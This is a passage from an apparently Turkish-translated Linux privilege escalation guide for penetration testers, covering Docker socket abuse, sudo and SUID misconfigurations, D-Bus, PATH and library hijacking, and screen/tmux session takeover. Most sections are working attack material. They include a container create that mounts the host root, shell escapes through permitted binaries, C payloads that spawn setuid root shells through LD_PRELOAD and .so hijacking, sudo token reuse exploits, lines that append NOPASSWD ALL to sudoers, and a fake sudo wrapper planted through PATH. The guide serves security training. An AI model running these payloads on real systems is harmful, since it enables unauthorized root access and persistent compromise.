curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Yeni oluşturulan container'ı başlatın:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` kullanarak container'a bağlantı kurun; böylece içinde komut çalıştırabilirsiniz.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` bağlantısını kurduktan sonra, host'un dosya sistemine root düzeyinde erişimle container içinde doğrudan komut çalıştırabilirsiniz.

### Diğerleri

Docker socket üzerinde yazma izinleriniz varsa çünkü **inside the group `docker`** iseniz [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Eğer [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

docker'dan çıkmak veya onu kötüye kullanarak ayrıcalıkları yükseltmenin daha fazla yolunu kontrol edin:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) ayrıcalık yükseltme

Eğer **`ctr`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **bunu kötüye kullanarak ayrıcalıkları yükseltebilirsiniz**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** ayrıcalık yükseltme

Eğer **`runc`** komutunu kullanabildiğinizi görürseniz, aşağıdaki sayfayı okuyun çünkü **bunu kötüye kullanarak ayrıcalıkları yükseltebilirsiniz**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus, uygulamaların verimli şekilde etkileşime girmesini ve veri paylaşmasını sağlayan gelişmiş bir **inter-Process Communication (IPC) sistemi**dir. Modern Linux sistemi düşünülerek tasarlanmış olup, farklı uygulama iletişim biçimleri için sağlam bir çerçeve sunar.

Sistem çok yönlüdür; süreçler arası veri alışverişini geliştiren temel IPC'yi destekler ve **geliştirilmiş UNIX domain sockets**'i andırır. Ayrıca olayların veya sinyallerin yayınlanmasını kolaylaştırır ve sistem bileşenleri arasında sorunsuz entegrasyonu teşvik eder. Örneğin, bir Bluetooth daemon'undan gelen gelen arama bildirimi müzik çalarını sessize aldırabilir ve kullanıcı deneyimini iyileştirebilir. Bunun yanı sıra D-Bus, uzak nesne sistemi desteği sunar; bu, uygulamalar arasında servis taleplerini ve metod çağrılarını basitleştirir, geleneksel olarak karmaşık olan süreçleri düzenler.

D-Bus, mesaj izinlerini (metod çağrıları, sinyal yayınlama vb.) eşleşen politika kurallarının kümülatif etkisine göre yöneten bir **allow/deny model**i üzerine çalışır. Bu politikalar bus ile etkileşimleri belirler ve bu izinlerin sömürülmesi yoluyla ayrıcalık yükseltmeye olanak tanıyabilir.

Böyle bir politikaya `/etc/dbus-1/system.d/wpa_supplicant.conf` içinde bir örnek verilmiştir; burada root kullanıcısının `fi.w1.wpa_supplicant1` üzerinde sahiplik, gönderme ve alma izinleri detaylandırılmıştır.

Belirli bir kullanıcı veya grup belirtilmemiş politikalar evrensel olarak uygulanır; "default" bağlam politikaları ise diğer spesifik politikalar tarafından kapsanmayan herkese uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini nasıl enumerate ve exploit edeceğinizi burada öğrenin:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı enumerate etmek ve makinenin konumunu belirlemek her zaman ilginçtir.

### Genel enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Erişim sağlamadan önce etkileşimde bulunamadığınız makinede çalışan ağ servislerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Trafiği sniff edip edemeyeceğinizi kontrol edin. Eğer yapabiliyorsanız, bazı credentials ele geçirebilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Genel Keşif

**kim** olduğunuzu, hangi **privileges**'a sahip olduğunuzu, sistemde hangi **kullanıcılar** bulunduğunu, hangilerinin **login** yapabildiğini ve hangilerinin **root privileges**'a sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Büyük UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalık yükseltmesi yapmasına izin veren bir hatadan etkilenmiştir. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
Exploit it using: **`systemd-run -t /bin/bash`**

### Gruplar

root ayrıcalıkları verebilecek bir grubun **üyesi** olup olmadığınızı kontrol edin:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Pano

Mümkünse panoda ilginç bir şey olup olmadığını kontrol edin
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Parola Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen parolalar

Eğer ortamdaki herhangi bir parolayı **biliyorsanız**, o parola ile **her kullanıcı olarak giriş yapmayı deneyin**.

### Su Brute

Eğer çok fazla gürültü çıkarmaktan rahatsız değilseniz ve bilgisayarda `su` ile `timeout` ikili dosyaları mevcutsa, [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak kullanıcıları brute-force etmeyi deneyebilirsiniz.\  
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile kullanıcıları brute-force etmeye çalışır.

## Yazılabilir PATH istismarları

### $PATH

Eğer **$PATH içindeki bazı klasörlere yazabiliyorsanız** yazılabilir klasörün içine, farklı bir kullanıcı (tercihen root) tarafından çalıştırılacak bir komutun adıyla **bir backdoor oluşturmak** suretiyle **escalate privileges** yapabilirsiniz; bu komut **$PATH'te sizin yazılabilir klasörünüzden önce gelen bir klasörden yüklenmemelidir**.

### SUDO ve SUID

Bazı komutları `sudo` ile çalıştırma izniniz olabilir veya suid biti ayarlanmış olabilir. Bunu şu şekilde kontrol edin:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar dosyaları okumanıza ve/veya yazmanıza veya hatta bir komutu çalıştırmanıza izin verir.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla parola bilmeden bazı komutları çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte kullanıcı `demo` `vim`'i `root` olarak çalıştırabiliyor; root dizinine bir ssh key ekleyerek veya `sh` çağırarak bir shell elde etmek artık basit.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir şeyi çalıştırırken **bir ortam değişkeni ayarlamasına** izin verir:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB machine Admirer'e dayanan**, script root olarak çalıştırılırken rastgele bir python kütüphanesini yüklemek amacıyla **PYTHONPATH hijacking**'e karşı **açıktı**:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV, sudo env_keep ile korundu → root shell

Eğer sudoers `BASH_ENV`'i koruyorsa (örn. `Defaults env_keep+="ENV BASH_ENV"`), izin verilen bir komutu çağırırken Bash'in etkileşimsiz başlangıç davranışından yararlanarak root olarak rastgele kod çalıştırabilirsiniz.

- Neden işe yarar: Etkileşimsiz shell'ler için, Bash `$BASH_ENV`'i değerlendirir ve hedef script çalıştırılmadan önce o dosyayı source eder. Birçok sudo kuralı bir script'i veya bir shell wrapper'ını çalıştırmaya izin verir. Eğer sudo `BASH_ENV`'i koruyorsa, dosyanız root ayrıcalıklarıyla source edilir.

- Gereksinimler:
- Çalıştırabileceğiniz bir sudo kuralı (etkileşimsiz şekilde `/bin/bash`'i çağıran herhangi bir hedef veya herhangi bir bash script).
- `BASH_ENV`'in `env_keep` içinde olması (`sudo -l` ile kontrol edin).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Sertleştirme:
- `BASH_ENV` (ve `ENV`) öğelerini `env_keep`'ten kaldırın, `env_reset`'i tercih edin.
- sudo-izinli komutlar için shell wrapper'lardan kaçının; mümkün olduğunca minimal ikili (binary) programlar kullanın.
- Korunan env değişkenleri kullanıldığında sudo I/O kayıtlamasını ve uyarı mekanizmalarını değerlendirin.

### Sudo yürütme atlatma yolları

**Jump**, diğer dosyaları okumak veya **symlinks** kullanmak için kullanılabilir. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılırsa (\*), daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komutu/SUID binary komut yolu olmadan

Eğer tek bir komuta yol belirtilmeden **sudo izni** verilmişse: _hacker10 ALL= (root) less_ PATH değişkenini değiştirerek bunu istismar edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** binary **başka bir komutu yolunu belirtmeden çalıştırıyorsa (her zaman garip bir SUID ikili dosyasının içeriğini _**strings**_ ile kontrol edin)** da kullanılabilir.

[Payload examples to execute.](payloads-to-execute.md)

### Komut yolu olan SUID binary

Eğer **suid** binary **komutun yolunu belirterek başka bir komut çalıştırıyorsa**, o zaman suid dosyasının çağırdığı komutla aynı isimde bir fonksiyonu **export a function** olarak oluşturmaya çalışabilirsiniz.

Örneğin, eğer bir suid binary _**/usr/sbin/service apache2 start**_ çağırıyorsa, fonksiyonu oluşturup export etmeyi denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid binary çağırıldığında bu fonksiyon çalıştırılacaktır

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** ortam değişkeni, loader tarafından diğerlerinin önünde, standart C kütüphanesi (`libc.so`) dahil olmak üzere yüklenmesi için bir veya daha fazla paylaşılan kütüphane (.so dosyası) belirtmek için kullanılır. Bu işleme bir kütüphanenin önceden yüklenmesi (preloading) denir.

Ancak, sistem güvenliğini korumak ve özellikle suid/sgid yürütülebilir dosyalarının bu özellik tarafından istismar edilmesini önlemek için sistem belirli koşullar uygular:

- Gerçek kullanıcı kimliği (_ruid_) ile etkili kullanıcı kimliği (_euid_) uyuşmayan yürütülebilir dosyalar için loader, **LD_PRELOAD**'u göz ardı eder.
- suid/sgid olan yürütülebilir dosyalar için, yalnızca standart yollarda bulunan ve aynı zamanda suid/sgid olan kütüphaneler önceden yüklenir.

Eğer `sudo` ile komut çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa, ayrıcalık yükselmesi meydana gelebilir. Bu yapılandırma, `sudo` ile komutlar çalıştırıldığında bile **LD_PRELOAD** ortam değişkeninin korunmasına ve tanınmasına izin verir; bu da yükseltilmiş ayrıcalıklarla rastgele kodun çalıştırılmasına yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
Şu isimle kaydedin **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Ardından şu komutla **derleyin**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Son olarak, **escalate privileges** çalıştırılıyor
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env variable'ını kontrol ediyorsa kötüye kullanılabilir çünkü kütüphanelerin aranacağı yolu o kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Beklenmedik görünen **SUID** izinlerine sahip bir **binary** ile karşılaşıldığında, **.so** dosyalarını düzgün yükleyip yüklemediğini doğrulamak iyi bir uygulamadır. Bu, aşağıdaki komutu çalıştırarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata görülmesi istismar ihtimaline işaret eder.

Bunu istismar etmek için, aşağıdaki kodu içeren, örneğin _"/path/to/.config/libcalc.c"_ adında bir C dosyası oluşturulur:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini manipüle ederek ve yükseltilmiş ayrıcalıklara sahip bir shell çalıştırarak ayrıcalıkları yükseltmeyi amaçlar.

Yukarıdaki C dosyasını bir shared object (.so) dosyasına şu şekilde derleyin:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Son olarak, etkilenen SUID binary'yi çalıştırmak exploit'i tetiklemeli ve potansiyel sistem ele geçirilmesine olanak tanımalıdır.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Yazabileceğimiz bir klasörden kütüphane yükleyen bir SUID binary bulduğumuza göre, gerekli isimle kütüphaneyi o klasöre oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Aşağıdaki gibi bir hata alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adlı bir fonksiyon içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) bir saldırganın yerel güvenlik kısıtlamalarını aşmak için suistimal edebileceği Unix ikili dosyalarının derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise aynı şeydir, ancak bir komuta **sadece argüman enjekte edebildiğiniz** durumlar içindir.

Proje, kısıtlı shell'lerden çıkmak, ayrıcalıkları yükseltmek veya sürdürmek, dosya aktarmak, bind ve reverse shell'ler oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için suistimal edilebilecek Unix ikili dosyalarının meşru işlevlerini toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l`'ye erişebiliyorsanız, herhangi bir sudo kuralını nasıl suistimal edeceğini bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Reusing Sudo Tokens

Parolasını bilmediğiniz ancak **sudo erişiminiz** olduğu durumlarda, ayrıcalıkları yükseltmek için **bir sudo komutunun çalıştırılmasını bekleyip oturum token'ını ele geçirmek** yoluna gidebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten `_sampleuser_` kullanıcısı olarak bir shell'e sahipsiniz
- `_sampleuser_` son 15 dakika içinde **`sudo` kullanmış** olmalıdır (varsayılan olarak bu, parola girmeden `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 olmalı
- `gdb` erişilebilir olmalı (yükleyebilmelisiniz)

(Geçici olarak `ptrace_scope`'u `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya kalıcı olarak `/etc/sysctl.d/10-ptrace.conf` dosyasını düzenleyip `kernel.yama.ptrace_scope = 0` olarak ayarlayabilirsiniz)

Tüm bu gereksinimler karşılanmışsa, **ayrıcalıkları şu araçla yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) _/tmp_ içinde `activate_sudo_token` ikili dosyasını oluşturacaktır. Bunu oturumunuzdaki sudo token'ını **aktif etmek** için kullanabilirsiniz (otomatik olarak root shell elde etmeyeceksiniz; `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **İkinci exploit** (`exploit_v2.sh`) _/tmp_ içinde **root tarafından sahip olunan ve setuid olan** bir sh shell oluşturacak
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Bu **üçüncü exploit** (`exploit_v3.sh`) **bir sudoers file oluşturacak**; bu **sudo tokens'ı süresiz hale getirir ve tüm kullanıcıların sudo kullanmasına izin verir**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Klasörde veya klasör içindeki oluşturulan dosyalardan herhangi birinde **yazma izinleri** varsa, ikili [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ile **create a sudo token for a user and PID** gerçekleştirebilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve o kullanıcı olarak PID 1234 ile bir shell'e sahipseniz, şifreyi bilmenize gerek olmadan **obtain sudo privileges** elde edebilirsiniz şu şekilde:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar kimlerin `sudo` kullanabileceğini ve kullanım şeklini yapılandırır.  
**Bu dosyalar varsayılan olarak yalnızca kullanıcı root ve grup root tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız** bazı **ilginç bilgiler elde edebilirsiniz**, ve eğer herhangi bir dosyayı **yazabiliyorsanız** **escalate privileges**
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Yazma izniniz varsa bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri suistimal etmenin başka bir yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

OpenBSD için `doas` gibi `sudo` ikili dosyasına bazı alternatifler vardır; yapılandırmasını `/etc/doas.conf`'da kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlandığını ve ayrıcalık yükseltmek için `sudo` kullandığını** ve o kullanıcı bağlamında bir shell elde ettiğinizi biliyorsanız, kodunuzu root olarak çalıştıracak ve ardından kullanıcının komutunu yürütecek yeni bir sudo çalıştırılabilir dosyası **oluşturabilirsiniz**. Sonra, kullanıcı bağlamının **$PATH**'ini (örneğin yeni yolu `.bash_profile` içine ekleyerek) değiştirerek, kullanıcı `sudo` çalıştırdığında sizin sudo çalıştırılabilir dosyanızın çalıştırılmasını sağlayabilirsiniz.

Kullanıcının farklı bir shell (bash olmayan) kullandığını unutmayın; yeni yolu eklemek için başka dosyaları değiştirmeniz gerekecektir. Örneğin [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Veya şöyle bir şey çalıştırmak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf`, **yüklenen yapılandırma dosyalarının nereden geldiğini** gösterir. Genellikle bu dosya şu yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin aranacağı** diğer klasörlere işaret eder. Örneğin, `/etc/ld.so.conf.d/libc.conf` içeriği `/usr/local/lib` olabilir. **Bu, sistemin `/usr/local/lib` içinde kütüphaneleri arayacağı anlamına gelir**.

Eğer herhangi bir nedenle **bir kullanıcının yazma izni** belirtilen yollardan herhangi birine sahipse: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının işaret ettiği herhangi bir klasör, ayrıcalıkları yükseltebilir.\
Bu yanlış yapılandırmanın **nasıl istismar edileceğini** görmek için aşağıdaki sayfaya bakın:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib'i `/var/tmp/flag15/` dizinine kopyalarsanız, program burada `RPATH` değişkeninde belirtildiği şekilde kullanacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` içine şu kötü amaçlı kütüphaneyi oluşturun: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetkiler

Linux capabilities, bir işleme mevcut root ayrıcalıklarının **bir alt kümesini sağlar**. Bu, root ayrıcalıklarını **daha küçük ve ayırt edilebilir birimlere** böler. Bu birimlerin her biri daha sonra işlemlere bağımsız olarak verilebilir. Bu şekilde ayrıcalıkların tam seti azaltılır ve istismar riskleri düşürülür.\
Aşağıdaki sayfayı okuyarak **capabilities hakkında ve bunların nasıl kötüye kullanılacağı hakkında** daha fazla bilgi edinebilirsiniz:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"execute" biti** etkilenen kullanıcının "**cd**" ile klasöre girebileceğini gösterir.\
**"read"** biti kullanıcının **files** listesini görebileceğini, ve **"write"** biti kullanıcının yeni **files** **create** ve **delete** edebileceğini gösterir.

## ACLs

Access Control Lists (ACLs), isteğe bağlı izinlerin ikincil katmanını temsil eder ve geleneksel ugo/rwx izinlerini **geçersiz kılma** yeteneğine sahiptir. Bu izinler, dosya veya dizin erişimi üzerinde, sahibi olmayan veya grubun bir parçası olmayan belirli kullanıcılara haklar verip/veya reddederek kontrolü artırır. Bu düzeydeki **granülerlik daha hassas erişim yönetimi sağlar**. Daha fazla ayrıntı için [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Ver** kullanıcı "kali"ya bir dosya üzerinde read ve write izinleri ver:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Al** sistemden belirli ACL'lere sahip dosyaları:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

**eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **hijack** edebilirsiniz.\
**en yeni sürümlerde** sadece **kendi kullanıcınızın** **screen sessions**'larına **connect** edebileceksiniz. Ancak oturumun içinde **ilginç bilgiler** bulabilirsiniz.

### screen sessions hijacking

**Listele screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Bu, **old tmux versions** ile ilgili bir sorundu. Bir yetkisiz kullanıcı olarak root tarafından oluşturulmuş bir tmux (v2.1) oturumunu hijack edemedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB**'e bakın.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.)  Eylül 2006 ile 13 Mayıs 2008 arasında oluşturulan tüm SSL ve SSH anahtarları bu hatadan etkilenmiş olabilir.\
Bu hata, bu OS'lerde yeni bir ssh anahtarı oluşturulurken ortaya çıkar, çünkü **sadece 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği ve **ssh public key'e sahip olduğunuzda karşılık gelen private key'i arayabileceğiniz** anlamına gelir. Hesaplanmış olasılıkları şurada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH İlginç yapılandırma değerleri

- **PasswordAuthentication:** Parola doğrulamasına izin verilip verilmediğini belirtir. Varsayılan `no`.
